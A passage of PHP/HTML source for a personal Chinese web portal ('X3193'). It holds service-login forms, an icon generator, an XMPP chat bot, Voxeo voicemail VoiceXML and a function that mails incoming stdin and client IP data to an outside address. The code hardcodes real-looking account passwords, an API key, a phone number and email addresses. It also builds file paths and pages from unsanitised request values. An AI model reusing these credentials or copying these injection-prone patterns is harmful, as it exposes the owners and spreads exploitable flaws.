                window.location='<?php echo httppath()."?api=zoho&skin=".$skincolor."&action=viewer";?>';
        }
        else{
                window.location='<?php echo httppath()."?api=zoho&skin=".$skincolor."&action=viewer";?>';
        }       
}
function dofileext(){
        if (document.getElementById("fileext").value == "ICON"){
                document.getElementById("iconsize").innerHTML = '<SELECT name="filetype" size="1" style="width:60px;height:16px;font-size:12px" onchange="dofiletype();" onmouseover="this.style.backgroundColor=\'#FCFC9D\';"><OPTION VALUE="1616">16*16</OPTION><OPTION VALUE="3232">32*32</OPTION><OPTION VALUE="4848">48*48</OPTION></SELECT>';
        }       
        else{
                document.getElementById("iconsize").innerHTML = '';
        }       
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=zoho&action=home&skin=<?php echo $skincolor;?>" method="post" name="zoho">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbsp选项：
                        <SELECT name="act" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:60px;height:16px;font-size:12px"  onchange="dofiletype();">
                        <?php 
                        if (trim(request("action")) == "meeting"){
                        ?>
                                <OPTION VALUE="meeting">会议</OPTION>
                        <?php 
                        }
                        elseif (trim(request("action")) == "calendar"){
                        ?>
                                <OPTION VALUE="planner">计划</OPTION>
                        <?php 
                        }
                        elseif (trim(request("action")) == "viewer"){
                        ?>
                                <OPTION VALUE="viewer">阅览</OPTION>
                        <?php 
                        }
                        else{
                        ?>
                                <OPTION VALUE="meeting">会议</OPTION>
                                <OPTION VALUE="planner">计划</OPTION>
                                <OPTION VALUE="viewer">阅览</OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
        break;
}
$style->footer();               
}
?>

<?php 
function webxml(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 服务");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "bond":
                                        switch (trim(request('type'))) {  // case start
                                        case "exchange":
                                        break;
                                                default:
                                                                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp证券代码：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:77px;height:16px;font-size:12px">
                                <OPTION VALUE="<?php echo encodeuri("行情");?>">行情简报</OPTION>
                                <OPTION VALUE="<?php echo encodeuri("走势");?>">走势图</OPTION>
                                <OPTION VALUE="<?php echo encodeuri("K线");?>">K 线图</OPTION>
                                <OPTION VALUE="<?php echo encodeuri("外汇");?>"  onchange="exchange();">外汇行情</OPTION>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                                        break;
                                }
                break;
        case "travel":
                break;
        case "weather":
                break;
        case "TV":
                break;
        case "airline.a":
                                        switch (trim(request('bot'))) {  // case start
                                        case "1":
                                        break;
                                                default:
                                        break;
                                }       
                break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp域名：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbsp端口：<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px">
                                <OPTION VALUE="imap">IMAP</OPTION>
                                <OPTION VALUE="pop3">POP3</OPTION>
                                <OPTION VALUE="nntp">NNTP</OPTION>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function picture(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 图片");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "robot.list":
                break;
        case "robot.create":
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
        document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
function dofiletype(){
        if (document.getElementById("filetype").value == "local"){
                document.getElementById("filepath").innerHTML = '&nbsp图片地址：<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
        }       
        else if(document.getElementById("filetype").value == "remote"){
                document.getElementById("filepath").innerHTML = '&nbsp图片地址：<input type="text" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
        }       
}
function dofileext(){
        if (document.getElementById("fileext").value == "ICON"){
                document.getElementById("iconsize").innerHTML = '<SELECT name="filetype" size="1" style="width:60px;height:16px;font-size:12px" onchange="dofiletype();" onmouseover="this.style.backgroundColor=\'#FCFC9D\';"><OPTION VALUE="1616">16*16</OPTION><OPTION VALUE="3232">32*32</OPTION><OPTION VALUE="4848">48*48</OPTION></SELECT>';
        }       
        else{
                document.getElementById("iconsize").innerHTML = '';
        }       
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="picture">
                        <form action="<?php echo ScriptPath();?>?api=picture&action=&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="picture">
                        <SELECT name="filetype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:75px;height:16px;font-size:12px" onchange="dofiletype();">
                                <OPTION VALUE="local">本地图片</OPTION>
                                <OPTION VALUE="remote">远程图片</OPTION>
                        </SELECT>
                        <span id="filepath">&nbsp图片地址：<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  </span>
                        &nbsp目标格式：
                        <SELECT name="fileext" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px" onchange="dofileext();">
                                <OPTION VALUE="XBM">XBM</OPTION>
                                <OPTION VALUE="ICON">ICON</OPTION>
                        </SELECT>
                        <span id="iconsize"></span>
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function icon(){

$iconsize = '50';
$im = @imagecreate($iconsize, $iconsize);//创建长宽各50像素的图象，格式未定。

$background_color = imagecolorallocate($im, 128, 255, 255);//创建青色的“PHP GD”图象变量，以备用，这里作为背景色彩。
$text_color = imagecolorallocate($im, 0, 0, 255);//创建兰色文字的“PHP GD”专用变量，以备用。

$linecolor = imagecolorallocate($im, 0, 0, 0);//创建黑色实线的“PHP GD”专用变量，以备用。
imagesetthickness($im, 2);//定义实线的粗细。

imageline($im, 0, 1, $iconsize, 1, $linecolor);
imageline($im, 0, $iconsize-1, $iconsize, $iconsize-1, $linecolor);//在图片的顶部和底部画两条实线。

imagestring($im, 5, 3, 17,  "X3193", $text_color);//在图片中间部分输出兰色字体。
//$text = 'Testing...';
//$font = './arial.ttf';
//imagettftext($im, 20, 0, 10, 20, $text_color, $font, $text);// 利用根目录arial.ttf字体文件输出文字，需要众多字体文件。

$debug = "0";
if ($debug == '1'){
        header("Content-type: image/png");//调试时，输出PNG格式的图象，与imagepng配合使用。
        imagepng($im);//调试时，输出PNG格式的图象，与header()配合使用。
        return;
}

$size = 32;  
$resize_im = @imagecreatetruecolor($size,$size);  // 创建一幅真彩图象。
$resize = $iconsize;
imagecopyresampled($resize_im,$im,0,0,0,0,$size,$size,$resize,$resize);  // 重采样拷贝部分图像并调整大小到新真彩图象中。

$icon = new phpthumb_ico();  
$gd_image_array = array($resize_im);  
$icon_data = $icon->GD2ICOstring($gd_image_array); // 调用GD2ICON 函数库创建未命名ICON图象。

imagedestroy($im);//销毁原由的非ico格式图象。
imagedestroy($resize_im);//销毁原由的ico格式图象。

$filename = "X3193.ico";  
if(file_put_contents($filename, $icon_data)){  //保存ico图象。
        return 'ok';
}
else{  
        return "no";  
}

exit;
}
?>

<?php 
function cpanel(){
if (strtolower(trim($_SERVER['SERVER_NAME'])) == "localhost"){
        $xmlstr = 'serverIP:0cliet:nr:index.php or From x3193@x3193.cz.cc Wed May 25 21:12:02 2011
Received: from col0-omc3-s11.col0.hotmail.com ([65.55.34.149])
        by freehost.urhostz.com with esmtp (Exim 4.69)
        (envelopea-from <x3193@x3193.cz.cc>)
        id 1QPRvW-00032c-8p
        for robot@xyu.x3193.cz.cc; Wed, 25 May 2011 21:12:02 -0700
Received: from COL106-W13 ([65.55.34.135]) by col0-omc3-s11.col0.hotmail.com with Microsoft SMTPSVC(6.0.3790.4675);
         Wed, 25 May 2011 21:11:57 -0700
Message-ID: <COL106-W13ADC8ACB9570E9DFCE7B0E3770@phx.gbl>
Content-Type: multipart/alternative;
        boundary="_34fe24f5-369a-4173-9962-035b90387e3d_"
X-Originating-IP: [123.144.6.188]
From: XiaYu <x3193@x3193.cz.cc>
To: <robot@xyu.x3193.cz.cc>
Subject: jj
Date: Thu, 26 May 2011 04:11:55 +0000
Importance: Normal
MIME-Version: 1.0
X-OriginalArrivalTime: 26 May 2011 04:11:57.0990 (UTC) FILETIME=[0E20B460:01CC1B5B]

--_34fe24f5-369a-4173-9962-035b90387e3d_
Content-Type: text/plain; charset="gb2312"
Content-Transfer-Encoding: 8bit


llll                                      
--_34fe24f5-369a-4173-9962-035b90387e3d_
Content-Type: text/html; charset="gb2312"
Content-Transfer-Encoding: 8bit

<html>
<head>
<style><!--
.hmmessage P
{
margin:0px;
padding:0px
}
body.hmmessage
{
font-size: 10pt;
font-family:微软雅黑
}
--></style>
</head>
<body class="hmmessage">
llll                                      </body>
</html>
--_34fe24f5-369a-4173-9962-035b90387e3d_--

1306383122


';      
}       
else{
        $xmlstr = file_get_contents('php://stdin');
}
//$xmlstr = str_replace("'","\"",$xmlstr);
//$xmlstr = substr(trim($xmlstr),stripos(trim($xmlstr),"boundary=")+strlen("boundary="),strlen($xmlstr));
//$xmlstr = substr(trim($xmlstr),0,stripos(trim($xmlstr),"\n"));
//$boundary = preg_replace("/[\'|\"]?([^\'\"]*)[\'|\"|]/", "\$1", $xmlstr);
//echo $boundary;
//return;


//print_r($emailarray);
//$emailsubject = arrmember(iconv_mime_decode_headers(arrmember(split("\r\n\r\n",$xmlstr),0),0,"gbk"),'Subject');
//$emailcontent = substr($emailsubject,strpos($emailsubject,'：')+2,strripos(substr($emailsubject,strpos($emailsubject,'：')+1,strpos($emailsubject,'@')-1),'@')-2);
//echo $emailcontent;
//$emailcontentarray = split('\r\n',quoted_printable_decode($emailarray[3]));
//print_r($emailcontentarray);
//print_r(split('\r\n',quoted_printable_decode($emailarray[3])));
//print_r(iconv_mime_decode_headers($emailarray[0],0, "gbk"));
mail('xcy6272003@126.com','x3193@web.x3193.cz.cc',$emailcontent.'server'.$_SERVER['REMOTE_HOST'].'IP:'.$_SERVER['REMOTE_ADDR'].strlen($_SERVER['REMOTE_ADDR']).'cliet:'.$_SERVER['SERVER_NAME'].'nr:'.'index.php'.' or '.$xmlstr.file_get_contents('php://stdin').time());
exit;
}
?>

<?php 
function jiankongbao(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 定时");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "robot.list":
                break;
        case "robot.create":
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        case "default":
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=xmpp&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
        default:
                $style = new css();
                
$conn = new XMPP('talk.google.com', 5222, 'wanw.x3193.3322.org@gmail.com', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=True, $loglevel=LOGGING_INFO);
$conn->connect();
while(!$conn->disconnected) {
        $payloads = $conn->processUntil(array('message', 'presence', 'end_stream', 'session_start'));
        foreach($payloads as $event) {
                $pl = $event[1];
                switch($event[0]) {
                        case 'message': 
                                print "---------------------------------------------------------------------------------\n";
                                print "Message from: {$pl['from']}\n";
                                if($pl['subject']) print "Subject: {$pl['subject']}\n";
                                print $pl['body'] . "\n";
                                print "---------------------------------------------------------------------------------\n";
                                $conn->message($pl['from'], $body="Thanks for sending me \"{$pl['body']}\".", $type=$pl['type']);
                                if($pl['body'] == 'quit') $conn->disconnect();
                                if($pl['body'] == 'break') $conn->send("</end>");
                        break;
                        case 'presence':
                                print "Presence: {$pl['from']} [{$pl['show']}] {$pl['status']}\n";
                        break;
                        case 'session_start':
                                $conn->presence($status="Cheese!");
                        break;
                }
        }
}
                
                break;
}
$style->footer();               
}
?>

<?php 
function han2ps($str){
        return Pinyin($str,getcharset(),true,"en");
}

function hanpc2enpc($str){
        $str = str_replace("，",",",$str);       
        $str = str_replace("。",".",$str);       
        $str = str_replace("！","!",$str);       
        $str = str_replace("？","?",$str);       
        $str = str_replace("：",":",$str);       
        $str = str_replace("；",";",$str);       
        $str = str_replace("――","-",$str);       
        $str = str_replace("（","(",$str);       
        $str = str_replace("）",")",$str);       
        $str = str_replace("“","\"",$str);       
        $str = str_replace("”","\"",$str);       
        $str = str_replace("《","<",$str);       
        $str = str_replace("》",">",$str);       
        $str = str_replace("‘","\'",$str);       
        $str = str_replace("’","\'",$str);       
        $str = str_replace("……","...",$str);       
        $str = str_replace("￥","$",$str);  
        return $str;
}

function voxeo(){
header('Content-Type: text/html; charset=utf-8');
header("Cache-Control: no-cache, must-revalidate");
switch (trim(request('action'))) {
        case "voice":
                switch (trim(request('act'))) {                       
                        case "record":
                        ?>
<?php 
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
?>
<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
   <form id="record">
   <record name="msg" beep="true" maxtime="1800s" finalsilence="4000ms" type="audio/x-wav" dtmfterm="true">
        <prompt timeout="5s" xml:lang="zh-cn"><?php  echo formatchar("请留言！","utf-8");?></prompt>
        <catch event="nomatch noinput help">
                <reprompt />
        </catch>        
   </record>
   <block>
        <prompt xml:lang="zh-cn"><?php  echo formatchar("您的留言是：","utf-8");?><value expr="msg"/></prompt>
        <prompt xml:lang="zh-cn"><?php  echo formatchar("留言成功！","utf-8");?></prompt>
   </block>
   <var name="callerid" expr="session.callerid"/>
   <var name="calledid" expr="session.telephone.dnis"/>
   <var name="uid" expr="<?php echo time();?>"/>
   <subdialog fetchtimeout="1200s" name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=message&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" namelist="msg callerid calledid uid" method="post">
        <filled>
                <if cond="oResult.code=='1'">
                        <prompt xml:lang="zh-cn"><value expr="oResult.info"/><?php  echo formatchar("谢谢！","utf-8");?></prompt>
                <else/>
                        <prompt xml:lang="zh-cn"><?php  echo formatchar("对不起！","utf-8");?></prompt><prompt xml:lang="zh-cn"><?php  echo formatchar("请重新留言！","utf-8");?></prompt>
                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585"/>
        </if>
    </filled>
   </subdialog>
   <block>
        <prompt xml:lang="zh-cn"><?php  echo formatchar("您的留言是！","utf-8");?></prompt>
        <audio expr="'./record/' + callerid + '->' + calledid + '-' + uid + '.wav'"></audio>
        <goto next="#backmenu"/>
   </block>
  </form>
  <form id="backmenu">
        <field name="inputitem">
           <prompt xml:lang="zh-cn"><break time="500ms"/><?php  echo formatchar("返回首页请按星号键，返回上页请按井号键！","utf-8");?></prompt>
      <catch event="nomatch noinput help">
                        <reprompt />
                </catch>
      <grammar mode="voice" root="item1">
       <rule id="item1">
        <one-of>
         <item><?php  echo formatchar("首页","utf-8");?></item>
         <item><?php  echo formatchar("上页","utf-8");?></item>
        </one-of>
       </rule>
      </grammar>
      <grammar mode="dtmf" root="item2">
      <rule id="item2">
       <one-of>
        <item>*</item>
        <item>#</item>
       </one-of>
      </rule>
     </grammar>
     <filled>
        <if cond="inputitem == '*'">
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <elseif cond="inputitem == '#'"/>
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <else/>
        <prompt><break time="500ms" /></prompt>
      </if>
     </filled>
    </field>
  </form>
</vxml>
<?php 
                                break;                        
                      	case "message": 
																$info = "'".formatchar("语音返回信息","utf-8")."'";
																$code = 1;
                                if (is_uploaded_file($_FILES['msg']['tmp_name'])){
   					 										//$twilio = new twilio_class();
             										//$twilio->twiliosendsms('json','+8615998963077',trim('您有一个新的语音留言，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'));
				      									$voxeo = new voxeo_class();
                  							$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077',trim('您有一个新的语音留言，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))));        
                                	                                                                               	
                                if (copy($_FILES['msg']['tmp_name'], "./record/".trim(request("callerid"))."->".trim(request("calledid"))."-".trim(request("uid")).".wav")){
                 													$vdisk = new vdisk_class();
																					if($vdisk->vdiskupload("xcy6272003@126.com", "EUIfgwe7","./record/".trim(request("callerid"))."->".trim(request("calledid"))."-".trim(request("uid")).".wav","0")){ 
                                								$code = 1;
																								$info = "'".formatchar("语音文件存储与网络备份成功","utf-8")."'";																						
																					}
																					else{
											                          $code = 0;
																								$info = "'".formatchar("语音文件存储与网络备份失败","utf-8")."'";											                          											                          
																					}
                                }
                                else{
                                								$code = 0;
																								$info = "'".formatchar("无法保存","utf-8")."'";	                                								
                                }
                                      
                                } 
                                else{                         	
                                        $code = 0;
																				$info = "'".formatchar("上传失败","utf-8")."'";	                                        
                                }                               

                                echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
                                echo '<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">';
                                echo '<form>';
                                echo '<clear namelist="code info"/>';
                                echo '<var name="code" expr="'.$code.'"/>';
                                echo '<var name="info" expr="'.$info.'"/>';
                                echo '<block>';
                                echo '<return namelist="code info"/>';
                                echo '</block></form></vxml>';
                                break;
                        case "sms":                            
                                break;
                        case "main":
                        ?>
<?php 
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
?>
<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
  <form id="topmenu">
        <field name="inputitem">
      <prompt xml:lang="zh-CN" >
        <break time="5s" /><?php  echo formatchar("您好！留言请按一；语音识别请按二","utf-8");?><break time="500ms" />
      </prompt>
      <catch event="nomatch noinput help">
                        <reprompt />
                </catch>
      <grammar mode="voice" root="item1">
       <rule id="item1">
        <one-of>
         <item>1</item>
         <item>2</item>
        </one-of>
       </rule>
      </grammar>
      <grammar mode="dtmf" root="item2">
      <rule id="item2">
       <one-of>
        <item>1</item>
        <item>2</item>        
       </one-of>
      </rule>
     </grammar>
     <filled>
       <if cond="inputitem == '1'">
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <elseif cond="inputitem == '2'"/>
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <else/>
        <prompt><break time="500ms" /></prompt>
      </if>
     </filled>
    </field>
  </form>
        <form id="goodbye">
                <block>
                        <prompt><break time="5s" /></prompt>
                        <prompt xml:lang="zh-CN" ><?php  echo formatchar("再见 ！","utf-8");?>	</prompt>
                        <disconnect/>
                </block>        
        </form>           
</vxml>
<?php 
                                break;
                        case "phonelimiter":
                                $voxeo = new voxeo_class();
                                $code =  $voxeo->voxeoverifycallid(trim(request('callerid')));
                                if ($code !== '1'){
   					 											//$twilio = new twilio_class();
             											//$twilio->twiliosendsms('json','+8615998963077',trim('您有一个新的语音访问点，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'),trim('X3193语音留言模块'));
				      										$voxeo = new voxeo_class();
                  								$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077',trim('您有一个新的语音访问点，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'));        

              							    	$html = new mail_class();
							                  	$html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193有一个新的语音访问点', trim('您有一个新的语音访问点，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'),trim('X3193语音留言模块'),'gb2312');
																}
		
                                echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
                                echo '<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">';
                                echo '<form id="topmenu">';
                                echo '<clear namelist="code" />';
                                echo '<var name="code" expr="'.$code.'"/>';
                                echo '<block>';
                                echo '<return namelist="code"/>';
                                echo '</block></form></vxml>';
                                break;
                        default:
                        ?>
<?php 
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
?>
<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
  <form id="topmenu">
   <var name="callerid" expr="session.callerid"/>
   <var name="calledid" expr="session.telephone.dnis"/>
   <var name="uid" expr="<?php echo time();?>"/>
